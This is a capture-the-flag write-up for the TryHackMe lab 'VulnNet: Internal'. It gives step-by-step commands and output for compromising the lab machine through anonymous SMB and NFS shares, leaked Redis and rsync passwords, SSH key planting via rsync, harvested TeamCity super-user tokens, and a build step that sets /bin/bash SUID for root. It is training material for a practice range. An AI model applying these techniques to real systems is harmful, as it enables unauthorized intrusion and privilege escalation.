# 25 - VulnNet: Internal

Room Link --> [https://tryhackme.com/room/vulnnetinternal](https://tryhackme.com/room/vulnnetinternal)

### Enumertion

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo nmap -p- -Pn 10.10.172.210 -vv --min-rate 10000-sS

# outputs
22/tcp    open     ssh          syn-ack ttl 63
111/tcp   open     rpcbind      syn-ack ttl 63
139/tcp   open     netbios-ssn  syn-ack ttl 63
445/tcp   open     microsoft-ds syn-ack ttl 63
873/tcp   open     rsync        syn-ack ttl 63
2049/tcp  open     nfs          syn-ack ttl 63
6379/tcp  open     redis        syn-ack ttl 63
9090/tcp  filtered zeus-admin   no-response
33685/tcp open     unknown      syn-ack ttl 63
34919/tcp open     unknown      syn-ack ttl 63
45725/tcp open     unknown      syn-ack ttl 63
46503/tcp open     unknown      syn-ack ttl 63
46515/tcp open     unknown      syn-ack ttl 63
```
{% endcode %}

#### SMB Enumeration

```
smbmap -H 10.10.172.210 -u 'anonymous' -p 'anonymous'

Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	shares                                            	READ ONLY	VulnNet Business Shares
	IPC$                                              	NO ACCESS	IPC Service (vulnnet-internal server (Samba, Ubuntu))
```

We have read access to "shares"drive. So we can access the share using smbclient.

```bash
smbclient //10.10.172.210/shares
# and we find the 1st flag inthe temp dir.
```

#### NFS Enumeration

NFS port 2049 is open, lets enumerate it. And the "/opt/conf"dir is open.

```
showmount -e 10.10.172.210

# outputs
Export list for 10.10.172.210:
/opt/conf *
```

Lets mount it on kali.

```bash
mkdir /mnt/thm
mount -t nfs 10.10.172.210:/opt/conf /mnt/thm -o nolock
mount # check if mounted successfully.
cd /mnt/thm && ls -al
# and we see all the shares available.
```

<figure><img src=".gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We see "redis"dir, and it contains password for Redis authentication.

<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now we  can authenticate to the redis server. `B65Hx562F@ggAZ@F` .

```
redis-cli -h 10.10.172.210
AUTH B65Hx562F@ggAZ@F

# and we are logged in redis.
```

<figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

There are 5 keys in the keyspace from the results.

{% code overflow="wrap" lineNumbers="true" %}
```bash
# Keyspace
db0:keys=5,expires=0,avg_ttl=0

KEYS * # view all the keys.
GET "internal flag" # view the key.
```
{% endcode %}

<figure><img src=".gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

And we got the 2nd flag.

### User Flag <a href="#user-flag" id="user-flag"></a>

To find the type of a key in redis we run the command "type \<key\_name>"

```bash
10.10.60.45:6379> TYPE authlist
list
```

We found that `authlist` is a list type key and to read it's value we can run the following command:

```bash
10.10.60.45:6379> lrange authlist 1 100
# and we find 3 more items in the list.
```

<figure><img src=".gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Decoding the base64 value:

{% code overflow="wrap" lineNumbers="true" %}
```bash
echo 'QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==' | base64 -d

# outputs
Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v
```
{% endcode %}

We  get a password for \[rsync] port 873.

### \[rsync enumeration]

Rsync, or Remote Sync, is a free command-line tool that lets you transfer files and directories to local and remote destinations. Rsync is used for mirroring, performing backups, or migrating data to other servers.

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -sV --script rsync-list-modules -p 873 10.10.172.210

# outputs
PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)
| rsync-list-modules: 
|_  files          	Necessary home interaction
```
{% endcode %}

After the below command is executed, all the files will be copied in **/sys-internal/** directory in our local system&#x20;

{% code overflow="wrap" lineNumbers="true" %}
```bash
┌──(dking㉿dking)-[~/Downloads]
└─$ rsync -av rsync://rsync-connect@10.10.172.210/files user_files
Password: 
receiving incremental file list
created directory user_files
./
sys-internal/
sys-internal/.Xauthority
sys-internal/.bash_history -> /dev/null
sys-internal/.bash_logout
sys-internal/.bashrc
sys-internal/.dmrc
sys-internal/.profile
sys-internal/.rediscli_history -> /dev/null
sys-internal/.sudo_as_admin_successful
sys-internal/.xscreensaver
sys-internal/.xsession-errors
sys-internal/.xsession-errors.old
sys-internal/user.txt
```
{% endcode %}

We can view the user flag.

{% code overflow="wrap" lineNumbers="true" %}
```bash
┌──(dking㉿dking)-[~/Downloads]
└─$ cat user_files/sys-internal/user.txt 
THM{da7c20696831f253e0afaca8b83c07ab}
```
{% endcode %}

### Gain shell access <a href="#gain-shell-access" id="gain-shell-access"></a>

While enumerating `sys-internal` files and directories, we found `.ssh` directory and we know that using `rsync` we can upload files. So we upload our `id_rsa.pub` to the `.ssh` directory using the command shown below.

{% code overflow="wrap" lineNumbers="true" %}
```bash
rsync ~/.ssh/id_rsa.pub rsync://rsync-connect@10.10.172.210/files/sys-internal/.ssh/authorized_keys
```
{% endcode %}

Now we can login with ssh to the server with our private key.

{% code overflow="wrap" lineNumbers="true" %}
```bash
ssh sys-internal@10.10.172.210 -i ~/.ssh/id_rsa
```
{% endcode %}

### Priv Esc

A quick look around finds an unusual folder at the root of the drive called TeamCity:

By reading `/TeamCity/conf/server.xml` it seems the port used is 8111.

To check:&#x20;

```bash
ss -nlpt | grep 8111`
```

So we need to port forward this local port to be able to access it. It should be easy enough with the SSH access.

{% code overflow="wrap" lineNumbers="true" %}
```bash
ssh -L 127.0.0.1:9999:127.0.0.1:8111 -i ~/.ssh/id_rsa sys-internal@10.10.172.210 -N
```
{% endcode %}

Then we can access it via "127.0.0.1:9999" in firefox.

<figure><img src=".gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

There is a message:

<table data-header-hidden><thead><tr><th width="40"></th><th></th></tr></thead><tbody><tr><td><pre><code>1
2
</code></pre></td><td><pre class="language-bash" data-overflow="wrap"><code class="lang-bash">No System Administrator found.
Log in as a Super user to create an administrator account.
</code></pre></td></tr></tbody></table>

So instead we are asked to login at [http://127.0.0.1:9999/login.html?super=1](http://127.0.0.1:9999/login.html?super=1) as a super user using an authentication token rather than credentials.

The token could be in the catalina configuration be it's read protected. So let's see in the logs instead.

{% code overflow="wrap" lineNumbers="true" %}
```bash
sys-internal@vulnnet-internal:~$ grep -ri token /TeamCity/logs/ 2>/dev/null
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 8-EDITED-5 (use empty username with the token as the password to access the server)
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 8-EDITED-5 (use empty username with the token as the password to access the server)
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 3-EDITED-6 (use empty username with the token as the password to access the server)
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 5-EDITED-2 (use empty username with the token as the password to access the server)
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 3-EDITED-0 (use empty username with the token as the password to access the server)
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 3-EDITED-0 (use empty username with the token as the password to access the server)

```
{% endcode %}

With super user access to the application, we can assume we’ll be using those privileges to gain root access to the server. Clicking the create project button takes me here:

![vulnet-internal-build](https://pencer.io/assets/images/2021-05-26-22-17-32.png)

I’ve clicked on Manually, then filled in the fields and clicked Create. Then I clicked on Build Configuration and filled that in:

![vulnet-internal-config](https://pencer.io/assets/images/2021-05-26-22-22-41.png)

After clicking create on this one we’re back at the settings page for our project. Now click on Build Steps:

![vulnet-internal-buildconfig](https://pencer.io/assets/images/2021-05-26-22-26-26.png)

Now navigate to BuildSteps -> Add build step. Now add the details as shown in the image below.

<figure><img src="https://digitalpress.fra1.cdn.digitaloceanspaces.com/iozzwn2/2021/05/5.png" alt="5"><figcaption></figcaption></figure>

Now click save and then run, go back to the user shell and check the permissions of `/bin/bash,` now it should be an SUID binary.

<figure><img src=".gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Done.

